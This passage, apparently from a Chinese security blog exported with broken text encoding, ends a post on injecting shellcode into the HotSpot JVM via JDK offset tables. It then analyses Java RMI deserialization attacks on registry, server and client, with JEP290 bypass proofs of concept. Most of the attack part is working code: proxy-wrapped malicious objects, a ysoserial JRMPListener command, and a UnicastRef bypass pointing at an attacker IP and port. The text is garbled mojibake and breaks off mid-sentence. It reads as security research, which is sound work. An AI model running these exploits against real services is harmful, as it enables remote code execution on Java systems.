†JVMé‡Œçš„æ•°æ®ç»“æ„ã€è®°å½•ä¸€å †oopå’Œå¸¸é‡æ± çš„å€¼ï¼Œè¿™è¦æ˜¯æƒ³å°†POCå†™æˆä¸€ä¸ªæ–‡ä»¶ç€å®æœ‰ç‚¹ä¸æ–¹ä¾¿å•Šã€‚é‚£æœ‰æ²¡æœ‰ä¸€ç§ç®€å•ç²—æš´çš„æ–¹æ³•å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚ç¬”è€…åˆšå¥½è£…æœ‰å¤šä¸ªç‰ˆæœ¬çš„JDKï¼Œå‘ç°JDKå¤§ç‰ˆæœ¬å’Œä½æ•°ç›¸åŒçš„æ—¶å€™ï¼Œä¸Šé¢é‚£äº›åç§»æ˜¯ä¸å˜çš„ã€‚ç¿»çœ‹JDKçš„æºç ä¸éš¾å‘ç°ï¼Œè¿™äº›offsetå½’æ ¹ç»“åº•æ˜¯ç”±offset_ofå®å¾—å‡ºï¼Œä¸€ä¸ªä¸Cè¯­è¨€offsetofä½œç”¨ç›¸åŒçš„å®ï¼Œç»“æœæ˜¯ä¸€ä¸ªç»“æ„æˆå‘˜ç›¸å¯¹äºç»“æ„å¼€å¤´çš„å­—èŠ‚åç§»é‡ã€‚ è€Œé€šè¿‡ä¹‹å‰æŸ¥é˜…çš„èµ„æ–™å¾—çŸ¥ï¼Œä¸åŒJDKå¤§ç‰ˆæœ¬ä¹‹é—´çš„oopæ•°æ®ç»“æ„æ‰å­˜åœ¨å·®å¼‚ï¼Œæˆ‘ä»¬åªè¦è®°å½•ä¸‹è¿™äº›ç›¸åŒæ¶æ„å’Œå¤§ç‰ˆæœ¬çš„åç§»ï¼Œå°±èƒ½ç›´æ¥è®¡ç®—å‡ºJITçš„åœ°å€ï¼Œå¯ä»¥å…å»åŠ è½½JVMé“¾æ¥åº“å’Œæ”¶é›†ã€å­˜å‚¨JVMé‡Œæ•°æ®ç»“æ„çš„æ“ä½œã€‚ ä»¥ä¸‹æ˜¯ç¬”è€…æ”¶é›†çš„éƒ¨åˆ†LTSç‰ˆæœ¬JDKçš„oopç›¸å…³åç§»ï¼š 1234567891011121314151617181920212223242526272829303132333435363738// JDK8 x32static int klassOffset = 0x44;static int methodArrayOffset = 0xe4;static int methodsOffset = 0x4;static int constMethodOffset = 0x4;static int constantPoolTypeSize = 0x2c;static int constantPoolOffset = 0x8;static int nameIndexOffset = 0x1a;static int signatureIndexOffset = 0x1c;static int _from_compiled_entry = 0x24;static int symbolTypeBodyOffset = 0x8;static int symbolTypeLengthOffset = 0x0;// JDK8 x64static int klassOffset = 0x48;static int methodArrayOffset = 0x180;static int methodsOffset = 0x8;static int constMethodOffset = 0x8;static int constantPoolTypeSize = 0x50;static int constantPoolOffset = 0x8;static int nameIndexOffset = 0x22;static int signatureIndexOffset = 0x24;static int _from_compiled_entry = 0x40;static int symbolTypeBodyOffset = 0x8;static int symbolTypeLengthOffset = 0x0;// JDK11 x64static int klassOffset = 0x50;static int methodArrayOffset = 0x198;static int methodsOffset = 0x8;static int constMethodOffset = 0x8;static int constantPoolTypeSize = 0x40;static int constantPoolOffset = 0x8;static int nameIndexOffset = 0x2a;static int signatureIndexOffset = 0x2c;static int _from_compiled_entry = 0x38;static int symbolTypeBodyOffset = 0x6;static int symbolTypeLengthOffset = 0x0; åè®°ç¬”è€…åœ¨JDK7ä¹Ÿæ›¾å°è¯•æ³¨å…¥shellcodeï¼Œä½†æœ€åè¿˜æ˜¯ä»¥å¤±è´¥å‘Šç»ˆï¼Œä¸ä»…æ˜¯å› ä¸ºJDK7åˆ°JDK8çš„oopæ•°æ®ç»“æ„å‘ç”Ÿäº†å¾ˆå¤§çš„å˜åŒ–ï¼Œè€Œä¸”JDK7ä¸­çš„ç±»ç¤ºä¾‹ä¸­å¹¶æ²¡æœ‰InstanceKlassç»“æ„æˆå‘˜ï¼Œä½†java_lang_CLassä¸­åˆç¡®ç¡®å®å®å­˜åœ¨_klass_offsetè¿™ä¸ªç»“æ„æˆå‘˜ï¼Œè¿™ç‚¹å°±æ¯”è¾ƒå¥‡æ€ªã€‚ ç¿»çœ‹å®˜æ–¹å·¥å…·HSDBæºç ï¼Œå‘ç°å®ƒæ˜¯é€šè¿‡BasicHashtable&lt;mtInternal&gt;çš„_bucketsç»“æ„æˆå‘˜è·å–æ‰€æœ‰InstanceKlassçš„ã€‚ç”±äºJDK7ä¸ŠPOCçš„oopæ•°æ®ç»“æ„éœ€è¦æ”¹åŠ¨è¾ƒå¤šï¼Œä¸”è¿˜ä¸çŸ¥é“BasicHashtable&lt;mtInternal&gt;è¦æ€ä¹ˆè·å–ï¼Œæ‰€ä»¥JDK7ä¸‹çš„POCè¿˜æœªå®ç°ã€‚ æœ€åä¸¤ä¸ªçš„shellcodeæ³¨å…¥æ–¹æ³•åŸºäºOracle JDKå’ŒOpenjdkçš„é»˜è®¤JVMï¼šHotSpotï¼Œå…¶ä»–ä¸€äº›çš„JVMçš„å®ç°æ–¹æ³•å°±è¦é™å¾…å„ä½å¸ˆå‚…å‘æ˜ã€‚ æ–‡ä¸­è‹¥æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œæœ›å„ä½å¸ˆå‚…ä¸åæ–§æ­£ã€‚ å‚è€ƒhttps://xz.aliyun.com/t/10075 https://www.slideshare.net/RyanWincey/java-shellcodeoffice https://github.com/xxDark/JavaShellcodeInjector/blob/master/src/main/java/me/xdark/shell/ShellcodeRunner.java https://qiankunli.github.io/2014/10/27/jvm_classloader.html https://www.sczyh30.com/posts/Java/jvm-klass-oop/ https://jishuin.proginn.com/p/763bfbd58ef3 https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html","link":"/2022/03/22/JVM_Shellcodeæ³¨å…¥æ¢ç´¢/"},{"title":"Java RMIæ”»å‡»åˆ†æä¸æ€»ç»“","text":"RMIç®€ä»‹Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³Java RMIï¼ˆJava Remote Method Invocationï¼‰æ˜¯Javaç¼–ç¨‹è¯­è¨€é‡Œï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ã€‚å®ƒä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ç‰¹æ€§ä½¿Javaç¼–ç¨‹äººå‘˜èƒ½å¤Ÿåœ¨ç½‘ç»œç¯å¢ƒä¸­åˆ†å¸ƒæ“ä½œã€‚å®ƒæ˜¯ç”±æ³¨å†Œä¸­å¿ƒã€æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¸‰éƒ¨åˆ†ç»„æˆã€‚ æ³¨å†Œä¸­å¿ƒ ä½œä¸ºå­˜å‚¨è¿œç¨‹æ–¹æ³•çš„ä»£ç†å¯¹è±¡çš„ä»“åº“ã€‚ æœåŠ¡ç«¯ æš´éœ²è¿œç¨‹å¯¹è±¡ï¼Œå¹¶å°†å…¶ä»£ç†å¯¹è±¡æ³¨å†Œè¿› RMI Registryã€‚ä¸€ä¸ªä»£ç†å¯¹è±¡åœ¨æœåŠ¡ç«¯ä¸­åŒ…å«ä¸€ä¸ªskeletonå¯¹è±¡ï¼Œç”¨äºæ¥å—æ¥è‡ªstubå¯¹è±¡çš„è°ƒç”¨ã€‚ å®¢æˆ·ç«¯ æŸ¥æ‰¾è¿œç¨‹ä»£ç†å¯¹è±¡ï¼Œè¿œç¨‹è°ƒç”¨æœåŠ¡å¯¹è±¡ã€‚ä¸€ä¸ªä»£ç†å¯¹è±¡åœ¨è°ƒç”¨è¯¥è¿œç¨‹å¯¹è±¡çš„å®¢æˆ·ç«¯ä¸ŠåŒ…å«ä¸€ä¸ªstubå¯¹è±¡ï¼Œè´Ÿè´£è°ƒç”¨å‚æ•°å’Œè¿”å›å€¼çš„åºåˆ—åŒ–ã€æ‰“åŒ…è§£åŒ…ï¼Œä»¥åŠç½‘ç»œå±‚çš„é€šè®¯è¿‡ç¨‹ã€‚ æ”»å‡»æ–¹å¼RMIçš„å„ç§æ”»å‡»æ–¹å¼æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨å¯¹è±¡ä¼ è¾“è¿‡ç¨‹ä¸­ååºåˆ—åŒ–å®ç°çš„ï¼Œä»¥ä¸‹æ˜¯å‡ ç§å¸¸è§çš„æ”»å‡»æ–¹å¼ã€‚ æ”»å‡»æ³¨å†Œä¸­å¿ƒå½“æœåŠ¡ç«¯å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œæ—¶ï¼Œæ³¨å†Œä¸­å¿ƒä¼šååºåˆ—åŒ–æœåŠ¡ç«¯ç»‘å®šçš„å¯¹è±¡ï¼Œå…·ä½“ä½“ç°åœ¨sun.rmi.registry.RegistryImpl_Skel#dispatchã€‚å½“æœåŠ¡ç«¯æ³¨å†Œç»‘å®šçš„æ˜¯ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡æ—¶ï¼Œå°±å¯é€ æˆååºåˆ—åŒ–æ¼æ´ã€‚å½“ç„¶ï¼Œç”±äºç»‘å®šçš„å¯¹è±¡éœ€è¦æ—¶Remoteå¯¹è±¡ï¼Œæ‰€ä»¥æ¶æ„å¯¹è±¡éœ€è¦å®ç°ä½¿ç”¨ä»£ç†ç±»æˆ–æ”¹å†™æ³¨å†Œæ–¹æ³•æ‰èƒ½æ³¨å†Œç»‘å®šã€‚ åœ¨è¿œç¨‹æ–¹æ³•å®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨çš„çˆ¶ç±»java.rmi.server.UnicastRemoteObjectçš„æ„é€ æ–¹æ³•ï¼Œæœ€ç»ˆæ˜¯è°ƒç”¨äº†sun.rmi.server.Util#createProxyæ–¹æ³•åˆ›å»ºRemoteçš„åŠ¨æ€ä»£ç†ç±»å¯¹è±¡å¹¶è¿”å›ã€‚ POCä¸­çš„åŠ¨æ€ä»£ç†ç±»æŒ‰ç…§createProxyæ–¹æ³•ä¸­é€»è¾‘å†™å³å¯ï¼Œå…¶ä¸­InvocationHandlerå­ç±»é€šå¸¸é€‰æ‹©sun.reflect.annotation.AnnotationInvocationHandlerï¼Œå®ƒå…·æœ‰Map&lt;String, Object&gt;ç±»å‹çš„å±æ€§memberValueså¯ä»¥å¾ˆæ–¹ä¾¿çš„ç»‘å®šååºåˆ—åŒ–çš„æ¶æ„å¯¹è±¡ã€‚ æœ€ç»ˆPOCå¦‚ä¸‹ï¼š 123456789101112131415Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();map.put(\"obj\", evilObject());InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);Remote remoteObj = (Remote) Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler);Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1009);registry.bind(\"AttackRegistry\", remoteObj); æ”»å‡»æœåŠ¡ç«¯ååºåˆ—åŒ–å‚æ•°æ”»å‡»æœåŠ¡ç«¯å…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡ååºåˆ—åŒ–è¿œç¨‹æ–¹æ³•å‚æ•°å®ç°çš„ã€‚æœåŠ¡ç«¯ååºåˆ—åŒ–å‚æ•°ä½“ç°åœ¨sun.rmi.server.UnicastServerRef#dispatchæ–¹æ³•é‡Œè°ƒç”¨çš„unmarshalParametersæ–¹æ³•ï¼Œæœ€ç»ˆé€šè¿‡sun.rmi.server.UnicastRef#unmarshalValueæ–¹æ³•ååºåˆ—åŒ–éåŸºæœ¬ç±»å‹çš„å‚æ•°ã€‚ 1234567 protected static Object unmarshalValue(Class&lt;?&gt; var0, ObjectInput var1) throws IOException, ClassNotFoundException { if (var0.isPrimitive()) { ... } else { return var1.readObject(); }} ååºåˆ—åŒ–å‚æ•°çš„åˆ©ç”¨POCæ¯”è¾ƒç®€å•ï¼Œä½†éœ€è¦æœåŠ¡ç«¯ä»¥Objectæœªå‚æ•°çš„è¿œç¨‹æ–¹æ³•ï¼ŒDemoå¦‚ä¸‹ï¼š 123456789101112131415# æ¥å£public interface IRemoteMethod extends Remote { public IRemoteMethod exploit(Object obj) throws RemoteException;}# å®ç°ç±»public class RemoteMethod extends UnicastRemoteObject implements IRemoteMethod { protected RemoteMethod() throws RemoteException { } public IRemoteMethod exploit(Object obj) throws RemoteException { return null; }} ç„¶ååœ¨å®¢æˆ·ç«¯é‡Œæ”¾ä¸ŠåŒæ ·çš„æ¥å£ï¼Œä»æ³¨å†Œä¸­å¿ƒè·å–è¿œç¨‹æ–¹æ³•ä¿¡æ¯ï¼Œå¹¶ä»¥æ¶æ„å¯¹è±¡è°ƒç”¨è¿œç¨‹æ–¹æ³•å³å¯ã€‚ 1234public static void main(String[] args) throws Exception { IRemoteMethod remoteMethod = (IRemoteMethod) new InitialContext().lookup(\"rmi://192.168.78.137:1009/RemoteMethod\"\"); remoteMethod.exploit(evilObject());} å¯¹äºéObjectå‚æ•°ï¼Œä½†åˆæ˜¯Objectå­ç±»çš„è¿œç¨‹æ–¹æ³•ï¼Œå¯ä»¥ç”¨åŠ¨æ€ä»£ç†æˆ–ç»§æ‰¿è¯¥å­ç±»çš„æ–¹æ³•ç»•è¿‡ã€‚ æ”»å‡»å®¢æˆ·ç«¯ååºåˆ—åŒ–æ³¨å†Œç»‘å®šå¯¹è±¡å½“å®¢æˆ·ç«¯lookupæ—¶ï¼Œä¹Ÿä¼šä»æ³¨å†Œä¸­å¿ƒè·å–å¹¶ååºåˆ—åŒ–æ³¨å†Œç»‘å®šçš„å¯¹è±¡ï¼Œè¿™æ—¶çš„ååºåˆ—åŒ–æ˜¯åœ¨å­˜æ ¹sun.rmi.registry.RegistryImpl_Stub#lookupæ–¹æ³•ä¸­è¿›è¡Œã€‚POCçš„æ„é€ ä¹Ÿä¸æ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–çš„å·®ä¸å¤šï¼Œåªæ˜¯æ”¹æˆç”±æ³¨å†Œä¸­å¿ƒæ³¨å†Œç»‘å®šæ¶æ„ç±»ï¼š 123456789101112131415Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();map.put(\"obj\", evilObject());InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);Remote remoteObj = (Remote) Proxy.newProxyInstance( Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler);Registry registry = LocateRegistry.createRegistry(1009);registry.bind(\"AttackRegistry\", remoteObj); ååºåˆ—åŒ–è¿”å›å€¼å½“è¿œç¨‹æ–¹æ³•çš„è¿”å›å€¼ä¸ä¸ºç©ºï¼Œä¸”ä¸ä¸ºåŸºç¡€ç±»å‹æ—¶ï¼Œå°±ä¼šå¯¹è¿”å›å€¼è¿›è¡Œååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–è¿”å›å€¼ä¸æœåŠ¡ç«¯ååºåˆ—åŒ–å‚æ•°çš„è°ƒç”¨æ ˆç±»ä¼¼ï¼Œæœ€ç»ˆéƒ½æ˜¯é€šè¿‡sun.rmi.server.UnicastRef#unmarshalValueæ–¹æ³•ååºåˆ—åŒ–ã€‚ POCä¹Ÿå¾ˆç®€å•ï¼Œè¿œç¨‹æ–¹æ³•ç›´æ¥è¿”å›æ¶æ„å¯¹è±¡å³å¯ï¼š 123456public class AttackerRemoteMethod extends UnicastRemoteObject implements IAttackerRemoteMethod { public Object exploit() throws RemoteException { return evilObject(); }} JEP290åŠå…¶ç»•è¿‡JEP290æ˜¯JDK9å¼•å…¥çš„è§„èŒƒï¼Œå¹¶ä¸”å‘ä¸‹å…¼å®¹åˆ°JDK 8u121ã€JDK 7u131å’ŒJDK 6u141ã€‚å…¶æ ¸å¿ƒæœºåˆ¶æ˜¯ç”±åºåˆ—åŒ–å®¢æˆ·ç«¯å®ç°å¹¶è®¾ç½®åœ¨ObjectInputStreamï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨è¿‡æ»¤å™¨æ¥å£æ–¹æ³•æ¥éªŒè¯æ­£åœ¨ååºåˆ—åŒ–çš„ç±»ã€æ­£åœ¨åˆ›å»ºçš„æ•°ç»„çš„å¤§å°ä»¥åŠååºåˆ—åŒ–çš„é•¿åº¦ã€æ·±åº¦å’Œååºåˆ—åŒ–æ—¶å¼•ç”¨çš„æ•°é‡ï¼Œè¿”å›REJECTEDã€ALLOWEDæˆ–UNDECIDEDçŠ¶æ€ã€‚ä»–çš„è¿‡æ»¤æ¥å£æ–¹æ³•å¹¶ä¸æ˜¯é»˜è®¤é…ç½®çš„ï¼Œè€Œæ˜¯é€šè¿‡jdk.serialFilterå±æ€§è®¾ç½®å…¨å±€è¿‡æ»¤æ¥å£æ–¹æ³•æˆ–setObjectInputFilteræ–¹æ³•è®¾ç½®å±€éƒ¨è¿‡æ»¤æ¥å£æ–¹æ³•ã€‚ åœ¨RMIååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä»…æ³¨å†Œä¸­å¿ƒåœ¨sun.rmi.registry.RegistryImpl#registryFilterä¸­å®ç°ï¼Œå¯¹ååºåˆ—åŒ–çš„æ·±åº¦ã€æ•°ç»„å¤§å°å’Œååºåˆ—åŒ–çš„ç±»åšäº†é™åˆ¶ã€‚ 1234567891011121314151617181920212223private static Status registryFilter(FilterInfo var0) { if (registryFilter != null) { Status var1 = registryFilter.checkInput(var0); if (var1 != Status.UNDECIDED) { return var1; } } if (var0.depth() &gt; 20L) { return Status.REJECTED; } else { Class var2 = var0.serialClass(); if (var2 != null) { if (!var2.isArray()) { return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED; } else { return var0.arrayLength() &gt;= 0L &amp;&amp; var0.arrayLength() &gt; 1000000L ? Status.REJECTED : Status.UNDECIDED; } } else { return Status.UNDECIDED; } }} UnicastRef ç±»ç»•è¿‡UnicastRef æ˜¯RMIæ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–ç™½åå•ä¸­çš„ç±»ï¼Œæ˜¯æ­£å¸¸bindå¯¹è±¡åæ³¨å†Œä¸­å¿ƒå¾—åˆ°çš„stubä¸­çš„å±æ€§ã€‚ ä¸‹é¢è°ƒè¯•ä¸‹æ­£å¸¸çš„æ³¨å†Œæµç¨‹ï¼Œç›´æ¥åœ¨sun.rmi.registry.RegistryImpl_Skel#dispatchå¤„ï¼Œæ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–æœåŠ¡ç«¯bindå¯¹è±¡å¼€å§‹ã€‚æ¥ç€è°ƒç”¨å°è£…ç±»çš„çˆ¶ç±»RemoteObjectçš„è‡ªå®šä¹‰readObjectæ–¹æ³•ã€‚åœ¨è¿™é‡Œä¼šå®ä¾‹åŒ–Referenceç±»UnicastRefï¼Œå¹¶è°ƒç”¨ä»–çš„readExternalååºåˆ—åŒ–ã€‚readExternalé‡Œæ¥ç€è°ƒç”¨sun.rmi.transport.LiveRef#readç»™UnicastRefçš„refå±æ€§èµ‹å€¼ã€‚ 123456read:291, LiveRef (sun.rmi.transport)readExternal:489, UnicastRef (sun.rmi.server)readObject:455, RemoteObject (java.rmi.server)...readObject:431, ObjectInputStream (java.io)dispatch:76, RegistryImpl_Skel (sun.rmi.registry) sun.rmi.transport.LiveRef#readæ–¹æ³•é‡Œï¼Œä¸»è¦é€»è¾‘æ˜¯ä»è¾“å…¥æµä¸­è·å–TCPEndpointå’ŒObjIDï¼Œæ¥åˆå§‹åŒ–LiveRefå¹¶è¿”å›ã€‚è¿™é‡Œçš„TCPEndpointè®°å½•ç€æœåŠ¡ç«¯ç›‘å¬çš„åœ°å€å’Œç«¯å£ï¼Œå¹¶ä¸”æ–¹æ³•é‡Œä¿å­˜LiveRefåˆ°è¾“å…¥æµçš„æ“ä½œä¼šå°†TCPEndpointä¿å­˜åˆ°è¾“å…¥æµçš„incomingRefTableå±æ€§ä¸­ï¼Œè¿™ä¸€æ­¥å¾ˆå…³é”®ã€‚ ååºåˆ—åŒ–ç»“æŸåå°±æ˜¯æ³¨å†Œå¼•ç”¨çš„æµç¨‹ã€‚ åœ¨sun.rmi.transport.DGCImpl_Stub#dirtyæ–¹æ³•é¦–å…ˆåˆ©ç”¨ååºåˆ—åŒ–çš„UnicastRefå»ºç«‹è¿æ¥ï¼Œè¿”å›ä¸€ä¸ªStreamRemoteCallå¯¹è±¡ï¼Œæ¥ç€è°ƒç”¨å®ƒçš„invokeæ–¹æ³•ã€‚ invokeæ–¹æ³•æœ€åè°ƒç”¨çš„æ˜¯StreamRemoteCallå¯¹è±¡çš„executeCallæ–¹æ³•ï¼Œé€šè¿‡getInputStreamæ–¹æ³•ä»connå±æ€§è·å–è¾“å…¥æµèµ‹å€¼ç»™inå±æ€§ï¼Œç„¶åä»è¾“å…¥æµä¸­è·å–ä¸€ä¸ªå­—èŠ‚èµ‹ç»™var1ï¼Œè¿›å…¥switchè¯­å¥ä¸­ï¼Œä¸º2åˆ™ååºåˆ—åŒ–è¾“å…¥æµã€‚è‡³æ­¤ä¸UnicateRefç»•è¿‡JEP290çš„æµç¨‹å°±ç»“æŸäº†ã€‚ 12345678910111213141516171819202122232425262728public void executeCall() throws Exception { DGCAckHandler var2 = null; byte var1; try { ... this.getInputStream(); var1 = this.in.readByte(); this.in.readID(); } catch (UnmarshalException var11) { ... } switch(var1) { case 1: return; case 2: Object var14; try { var14 = this.in.readObject(); } catch (Exception var10) { throw new UnmarshalException(\"Error unmarshaling return\", var10); } ... } ...} å…³äºè¿™ä¸ªvar1ä½œç”¨ï¼ŒæŸ¥äº†AdoptOpenJDKçš„æºç å¾—çŸ¥æ˜¯JRMPåè®®ä¸­è¿”å›å€¼çš„æ ‡è®°ï¼Œæ­£å¸¸è¿”å›å€¼ä¸ä¼šè¿›è¡Œååºåˆ—åŒ–ã€‚UnicastRefç»•è¿‡JEP290ä½¿ç”¨ysoserialä¸­çš„JRMPlistenerï¼Œå…¶å°†æŠ¥é”™è¿”å›æ”¹æˆååºåˆ—åŒ–çš„payloadï¼Œå®ç°å‘½ä»¤æ‰§è¡Œã€‚ æœ€åæœåŠ¡ç«¯çš„ä»£ç å¦‚ä¸‹ï¼Œç›¸æ¯”æ­£å¸¸çš„æµç¨‹å¯ä»¥æ§åˆ¶LiveRefæŒ‡å‘æ¶æ„çš„æœåŠ¡ç«¯ipå’Œç«¯å£ã€‚ 1234567891011121314public class UnicastRefBypass { public static void main(String[] args) throws Exception { Registry reg = LocateRegistry.getRegistry(\"localhost\", 1009); ObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\"10.91.33.139\", 3333); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(UnicastRefBypass.class.getClassLoader(), new Class[]{ Registry.class }, obj); reg.bind(\"UnicastRefBypass\", proxy); }} UnicastRemoteObjectç±»ç»•è¿‡åœ¨8u231çš„ä¿®å¤ä¸­ï¼Œsun.rmi.transport.DGCImpl_Stub#dirtyæå‰ä¸ºè¾“å…¥æµfilterå±æ€§è®¾ç½®äº†è¿‡æ»¤æ¥å£æ–¹æ³•ï¼Œåœ¨åç»­sun.rmi.transport.StreamRemoteCall#executeCallä¸­åˆæ•è·è¿‡æ»¤æ¥å£æ–¹æ³•æŠ›å‡ºçš„InvalidClassExceptionå¼‚å¸¸ï¼Œæ¸…ç©ºè¾“å…¥æµä¸­incomingRefTableå±æ€§çš„å€¼ã€‚å‰è€…ä½¿å¾—åˆ©ç”¨UnicastRefç±»ç»•è¿‡æ–¹å¼åœ¨ååºåˆ—åŒ–Exceptionè¿”å›å€¼æ—¶æ— æ³•ååºåˆ—åŒ–ä»»æ„ç±»ã€‚ å›½å¤–å®‰å…¨ç ”ç©¶å‘˜An Trinhåœ¨8u231ç‰ˆæœ¬å‘å¸ƒå‰æå‡ºçš„ä¸€ç§ç»•è¿‡æ–¹å¼ï¼Œæ²¡æœ‰ä½¿ç”¨æ³¨å†Œæµç¨‹ä¸­æ³¨å†Œä¸­å¿ƒå‘èµ·è¿æ¥åˆ°æœåŠ¡ç«¯çš„è¾“å…¥æµï¼Œè€Œæ˜¯åˆ©ç”¨æ³¨å†Œä¸­å¿ƒåœ¨ååºåˆ—åŒ–æœåŠ¡ç«¯ç»‘å®šçš„å¯¹è±¡è¿‡ç¨‹ä¸­å‘èµ·JRMPè¯·æ±‚ï¼Œå·§å¦™åœ°ç»•è¿‡äº†è¿‡æ»¤ã€‚ å…ˆä»ç›´æ¥ååºåˆ—åŒ–æ„é€ çš„å¯¹è±¡æ¥å¤ç°ä¸‹è¿™ä¸ªPOCï¼Œé¦–å…ˆç”¨ysoserialèµ·ä¸€ä¸ªJRMPListenerçš„exploitã€‚ 1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections6 &quot;calc&quot; ç„¶åå†ç°åœ¨ä¸‹é¢çš„POCååºåˆ—åŒ–ã€‚ 123456789101112131415161718192021222324252627282930ObjID id = new ObjID(new Random().nextInt());TCPEndpoint te = new TCPEndpoint(\"127.0.0.1\", 3333);UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance( RMIServerSocketFactory.class.getClassLoader(), new Class[]{RMIServerSocketFactory.class, Remote.class}, obj);Constructor constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);constructor.setAccessible(true);UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) constructor.newInstance(null);Field field = UnicastRemoteObject.class.getDeclaredField(\"ssf\");field.setAccessible(true);field.set(unicastRemoteObject, serverSocketFactory);// Registry reg = LocateRegistry.getRegistry(\"localhost\", 1009);// reg.bind(\"Exploit\", unicastRemoteObject);ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);objectOutputStream.writeObject(unicastRemoteObject);byte[] result = byteArrayOutputStream.toByteArray();ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);objectInputStream.readObject(); è°ƒç”¨æ ˆå¾ˆé•¿ï¼Œå…ˆä»java.rmi.server.UnicastRemoteObject#reexportæ–¹æ³•å¼€å§‹ã€‚å½“csfæˆ–ssfå±æ€§éç©ºæ—¶ï¼Œä¼šç”¨csfå’Œssfå®ä¾‹åŒ–ä¸€ä¸ªUnicastServerRef2å¯¹è±¡ï¼Œå¹¶è°ƒç”¨UnicastServerRef2çˆ¶ç±»UnicastServerRefçš„exportObjectæ–¹æ³•ã€‚ UnicastServerRefçš„exportObjectæ–¹æ³•å°±æ˜¯å®ç°ç›‘å¬ç«¯å£çš„æ“ä½œã€‚åç»­ç²¾å½©çš„éƒ¨åˆ†æ¥äº†ï¼Œç›‘å¬ç«¯å£çš„æ“ä½œä¼šè°ƒç”¨sun.rmi.transport.tcp.TCPEndpoint#newServerSocketæ–¹æ³•ï¼Œå…¶ä¸­ä¼šè°ƒç”¨å®ƒçš„ssfå±æ€§çš„æ–¹æ³•ï¼Œè¿™ä¸ªssfå±æ€§ä¸å‰é¢UnicastRemoteObjectå¯¹è±¡çš„ssfå±æ€§ä¸€è‡´ï¼Œæ˜¯å°è£…RemoteObjectInvocationHandlerçš„ä»£ç†ç±»å¯¹è±¡ã€‚ç”±äºä»£ç†ç±»çš„ç‰¹æ€§ï¼Œä¼šå…ˆè°ƒç”¨RemoteObjectInvocationHandlerç±»çš„invokeæ–¹æ³•ã€‚å†åé¢çš„è°ƒç”¨æ ˆä¸å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•çš„è°ƒç”¨æ ˆä¸€è‡´ï¼Œä¹Ÿå°±æ˜¯åŸæœ¬çš„æ³¨å†Œä¸­å¿ƒå˜æˆäº†å®¢æˆ·ç«¯ï¼Œç”±äºå®¢æˆ·ç«¯æ²¡æœ‰å¯åŠ¨JEP290è®¾ç½®ï¼Œä¹Ÿå°±ç»•è¿‡äº†æ³¨å†Œä¸­å¿ƒçš„JEP290é™åˆ¶ã€‚ å•åœ¨å®é™…æ³¨å†Œç»‘å®šçš„è¿‡ç¨‹ä¸­ï¼Œæ„é€ 